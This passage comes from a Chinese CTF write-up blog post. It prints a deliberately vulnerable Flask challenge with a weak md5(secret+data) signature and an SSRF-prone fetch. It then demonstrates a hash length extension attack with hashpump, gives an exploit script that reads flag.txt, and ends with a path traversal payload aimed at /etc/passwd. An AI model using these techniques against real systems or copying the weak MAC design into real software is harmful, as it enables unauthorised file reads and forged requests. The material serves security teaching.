class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="hljs-comment">#encoding=utf-8</span></span><br><span class="line"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask</span><br><span class="line"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request</span><br><span class="line"><span class="hljs-keyword">import</span> socket</span><br><span class="line"><span class="hljs-keyword">import</span> hashlib</span><br><span class="line"><span class="hljs-keyword">import</span> urllib</span><br><span class="line"><span class="hljs-keyword">import</span> sys</span><br><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line"><span class="hljs-keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="hljs-string">&apos;latin1&apos;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="hljs-number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Task</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):          <span class="hljs-comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Exec</span>(<span class="hljs-params">self</span>):</span></span><br><span class="line">        result = {}</span><br><span class="line">        result[<span class="hljs-string">&apos;code&apos;</span>] = <span class="hljs-number">500</span></span><br><span class="line">        <span class="hljs-keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&apos;w&apos;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="hljs-string">&apos;data&apos;</span>] = resp</span><br><span class="line">                <span class="hljs-keyword">else</span>:</span><br><span class="line">                    <span class="hljs-built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="hljs-string">&apos;code&apos;</span>] = <span class="hljs-number">200</span></span><br><span class="line">            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:</span><br><span class="line">                f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&apos;r&apos;</span>)</span><br><span class="line">                result[<span class="hljs-string">&apos;code&apos;</span>] = <span class="hljs-number">200</span></span><br><span class="line">                result[<span class="hljs-string">&apos;data&apos;</span>] = f.read()</span><br><span class="line">            <span class="hljs-keyword">if</span> result[<span class="hljs-string">&apos;code&apos;</span>] == <span class="hljs-number">500</span>:</span><br><span class="line">                result[<span class="hljs-string">&apos;data&apos;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            result[<span class="hljs-string">&apos;code&apos;</span>] = <span class="hljs-number">500</span></span><br><span class="line">            result[<span class="hljs-string">&apos;msg&apos;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="hljs-keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkSign</span>(<span class="hljs-params">self</span>):</span></span><br><span class="line">        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&apos;GET&apos;</span>, <span class="hljs-string">&apos;POST&apos;</span>]</span>)</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="hljs-string">&quot;scan&quot;</span></span><br><span class="line">    <span class="hljs-keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&apos;/De1ta&apos;</span>,methods=[<span class="hljs-string">&apos;GET&apos;</span>,<span class="hljs-string">&apos;POST&apos;</span>]</span>)</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="hljs-keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="hljs-keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&apos;/&apos;</span></span>)</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">scan</span>(<span class="hljs-params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="hljs-number">1</span>)</span><br><span class="line">    <span class="hljs-keyword">try</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]</span><br><span class="line">    <span class="hljs-keyword">except</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getSign</span>(<span class="hljs-params">action, param</span>):</span></span><br><span class="line">    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span>(<span class="hljs-params">content</span>):</span></span><br><span class="line">    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span>(<span class="hljs-params">param</span>):</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:</span><br><span class="line">    app.debug = <span class="hljs-literal">False</span></span><br><span class="line">    app.run(host=<span class="hljs-string">&apos;0.0.0.0&apos;</span>,port=<span class="hljs-number">80</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x786E;&#x5B9E;&#x770B;&#x8D77;&#x6765;&#x597D;&#x61F5;&#x903C;&#x554A;<br>&#x610F;&#x601D;&#x662F;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x63D0;&#x793A;&#x7ED9;&#x7684;&#x662F; flag &#x5728; ./flag.txt &#x4E2D;</span><br><span class="line"></span><br><span class="line">python &#x7684; flask &#x6846;&#x67B6;&#xFF0C;&#x4E09;&#x4E2A;&#x8DEF;&#x7531;&#xFF0C;index &#x7528;&#x4E8E;&#x83B7;&#x53D6;&#x6E90;&#x7801;&#xFF0C;geneSign &#x7528;&#x4E8E;&#x751F;&#x6210; md5&#xFF0C;De1ta &#x5C31;&#x662F;&#x6311;&#x6218;</span><br><span class="line"></span><br><span class="line">&#x5927;&#x6982;&#x601D;&#x8DEF;&#x5C31;&#x662F;&#x5728; /De1ta &#x4E2D; get param &#xFF0C;cookie action sign &#x53BB;&#x8BFB;&#x53D6; flag.txt&#xFF0C;&#x5176;&#x4E2D;&#xFF0C;param=flag.txt&#xFF0C;action &#x4E2D;&#x8981;&#x542B;&#x6709; read &#x548C; scan&#xFF0C;&#x4E14; sign=md5(secert_key + param + action)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x4F7F;&#x7528;&#x54C8;&#x5E0C;&#x62D3;&#x5C55;&#x653B;&#x51FB;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secert_key &#x662F;&#x4E00;&#x4E2A;&#x957F;&#x5EA6;&#x4E3A; 16 &#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5728; /geneSign?param=flag.txt &#x4E2D;&#x53EF;&#x4EE5;&#x83B7;&#x53D6; md5(secert_key + &apos;flag.txt&apos; + &apos;scan&apos;) &#x7684;&#x503C;,&#x4E3A; 4bb4d74933b882b845a15a384f927bab&#xFF0C;&#x800C;&#x76EE;&#x6807;&#x5219;&#x662F;&#x83B7;&#x53D6; md5(secert_key + &apos;flag.txt&apos; + &apos;readscan&apos;) &#x7684;&#x503C;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x9996;&#x5148;&#x7528;hashpump</p>
+<figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kitty@ubuntu:~/&#x684C;&#x9762;$ hashpump</span><br><span class="line">Input Signature: 4bb4d74933b882b845a15a384f927bab</span><br><span class="line">Input Data: scan</span><br><span class="line">Input Key Length: 24</span><br><span class="line">Input Data to Add: <span class="hljs-built_in">read</span> </span><br><span class="line">13e9cdc14801527def75d258d46cab59</span><br><span class="line">scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read</span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x6240;&#x4EE5;exp&#x4E3A;:</p>
+<figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="hljs-string">&apos;http://acc709a0-59ca-44ac-9af9-5cf20b5635c0.node2.buuoj.cn.wetolink.com:82/De1ta?param=flag.txt&apos;</span></span><br><span class="line"></span><br><span class="line">cookies = {</span><br><span class="line">  <span class="hljs-string">&apos;sign&apos;</span>: <span class="hljs-string">&apos;13e9cdc14801527def75d258d46cab59&apos;</span>,</span><br><span class="line">  <span class="hljs-string">&apos;action&apos;</span>: <span class="hljs-string">&apos;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read&apos;</span>,</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">res = requests.get(url=url, cookies=cookies)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x4E5F;&#x53EF;&#x4EE5;&#x5B57;&#x7B26;&#x4E32;&#x62FC;&#x63A5;<br>&#x4E0D;&#x59A8;&#x5047;&#x8BBE; secert_key &#x662F; xxx &#xFF0C;&#x90A3;&#x4E48;&#x5728;&#x5F00;&#x59CB;&#x8BBF;&#x95EE; <code>/geneSign?param=flag.txt</code> &#x7684;&#x65F6;&#x5019;&#xFF0C;&#x8FD4;&#x56DE;&#x7684; md5 &#x5C31;&#x662F; <code>md5(&apos;xxx&apos; + &apos;flag.txt&apos; + &apos;scan&apos;)</code> &#xFF0C;&#x5728; python &#x91CC;&#x9762;&#x4E0A;&#x8FF0;&#x8868;&#x8FBE;&#x5F0F;&#x5C31;&#x76F8;&#x5F53;&#x4E8E;<code>md5(xxxflag.txtscan)</code>&#xFF0C;&#x8FD9;&#x5C31;&#x5F88;&#x6709;&#x610F;&#x601D;&#x4E86;&#x3002;</p>
+<p>&#x76F4;&#x63A5;&#x6784;&#x9020;&#x8BBF;&#x95EE;<code>/geneSign?param=flag.txtread</code> &#xFF0C;&#x62FF;&#x5230;&#x7684; md5 &#x5C31;&#x662F;<code>md5(&apos;xxx&apos; + &apos;flag.txtread&apos; + &apos;scan&apos;</code>) &#xFF0C;&#x7B49;&#x4EF7;&#x4E8E; <code>md5(&apos;xxxflag.txtreadscan&apos;)</code>&#xFF0C;&#x8FD9;&#x5C31;&#x8FBE;&#x5230;&#x4E86;&#x76EE;&#x6807;&#x3002;<br>&#x56E0;&#x4E3A;<code>md5(&apos;xxx&apos; + &apos;flag.txtread&apos; + &apos;scan&apos;)&#x7B49;&#x4E8E;md5(&apos;xxx&apos; + &apos;flag.txt&apos; + &apos;readscan&apos;)</code><br>&#x7136;&#x540E;&#x76F4;&#x63A5;&#x8BBF;&#x95EE; <code>/De1ta?param=flag.txt</code>&#x6784;&#x9020; <code>cookie: action=readscan;sign={&#x4E0A;&#x9762;&#x83B7;&#x5F97;&#x7684;md5&#x503C;}</code>&#x5373;&#x53EF;</p>
+<h3 id="&#x60F3;&#x6CD5;"><a href="#&#x60F3;&#x6CD5;" class="headerlink" title="&#x60F3;&#x6CD5;"></a>&#x60F3;&#x6CD5;</h3><p>&#x901A;&#x8FC7;&#x4EE5;&#x4E0A;&#x7684;&#x5206;&#x6790;&#xFF0C;&#x60F3;&#x5FC5;&#x5927;&#x5BB6;&#x5BF9;&#x6B64;&#x653B;&#x51FB;&#x6709;&#x4E86;&#x66F4;&#x6DF1;&#x5165;&#x7684;&#x8BA4;&#x8BC6;&#x3002;&#x53EA;&#x8981;&#x5B58;&#x5728;&#x8106;&#x5F31;&#x7684;&#xFF08;&#x4F7F;&#x7528;&#x6B64;&#x7C7B;&#x6563;&#x5217;&#x7B97;&#x6CD5;&#xFF09;Message authentication codes (MACs)&#x7528;&#x4E8E;&#x9A8C;&#x8BC1;&#x4FE1;&#x606F;&#x771F;&#x5B9E;&#x6027;&#x7684;&#x5730;&#x65B9;&#x5C31;&#x5F88;&#x53EF;&#x80FD;&#x53D7;&#x6B64;&#x653B;&#x51FB;&#x3002;<br>&#x6BD4;&#x5982;&#xFF0C;&#x6211;&#x4EEC;&#x53D1;&#x73B0;&#x4E86;&#x8FD9;&#x6837;&#x7684;&#x4E00;&#x4E2A;&#x4E0B;&#x8F7D;&#x6587;&#x4EF6;&#x7684;&#x63A5;&#x53E3;&#xFF1A;<code>/download?name=test.pdf&amp;sig=6543109bb53887f7bb46fe424f26e24a</code>sig&#x53EF;&#x80FD;&#x662F;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x67D0;&#x79CD;&#x6821;&#x9A8C;&#x7B7E;&#x540D;&#xFF0C;&#x5982;&#x679C;&#x60F3;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x63A5;&#x53E3;&#x4E0B;&#x8F7D;&#x5176;&#x4ED6;&#x6587;&#x4EF6;&#x5C31;&#x4F1A;&#x5931;&#x8D25;&#xFF0C;&#x56E0;&#x4E3A;sig&#x6821;&#x9A8C;&#x4E0D;&#x8FC7;&#x3002;&#x540C;&#x65F6;&#x8FD8;&#x4F1A;&#x53D1;&#x73B0;<code>md5(name) !== sig</code>&#xFF0C;&#x5F88;&#x660E;&#x663E;&#x5728;&#x6821;&#x9A8C;&#x7B97;&#x6CD5;&#x4E2D;&#x6DFB;&#x52A0;&#x4E86;&#x76D0;&#xFF0C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x60F3;&#x4E0B;&#x8F7D;&#x4EFB;&#x610F;&#x7684;&#x6587;&#x4EF6;&#x6BD4;&#x5982;<code>test.pdf%00/../../../../etc/passwd</code>&#xFF0C;&#x6B63;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#x662F;&#x6CA1;&#x529E;&#x6CD5;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x6709;&#x76D0;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x65E0;&#x6CD5;&#x6784;&#x9020;&#x81EA;&#x5DF1;&#x7684;&#x7B7E;&#x540D;&#x503C;&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C;&#x670D;&#x52A1;&#x7AEF;&#x4F7F;&#x7528;&#x4E86;&#x7C7B;&#x4F3C;<code>if ($sig === md5($salt.$name))</code>&#x7684;&#x6821;&#x9A8C;&#x4EE3;&#x7801;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4F1A;&#x5B58;&#x5728;&#x6B64;&#x653B;&#x51FB;&#x3002;</p>
+</body></html>
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/CTF/">#CTF</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2019/11/19/flask%E5%88%B0SSTI/">从flask到SSTI</a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2019/11/19/md5%E7%AE%97%E6%B3%95%E7%9A%84%E5%AD%A6%E4%B9%A0%E5%92%8Cc-python3%E7%9A%84%E5%AE%9E%E7%8E%B0/"></a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2020 John Doe&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow has-text-black" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>
+
+<!-- test if the browser is outdated -->
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
+<script>
+    $(document).ready(function () {
+        // plugin function, place inside DOM ready function
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        })
+    });
+</script>
+
+<script>
+    window.FontAwesomeConfig = {
+        searchPseudoElements: true
+    }
+    moment.locale("en-AU");
+</script>
+
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script>
+    MathJax.Hub.Config({
+        "HTML-CSS": {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+</script>
+
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof($.fn.justifiedGallery) === 'function') {
+                $('.justified-gallery').justifiedGallery();
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js"></script>
+
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-mask"></div>
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Pages',
+                CATEGORIES: 'Categories',
+                TAGS: 'Tags',
+                UNTITLED: '(Untitled)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-epsilon2_1"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
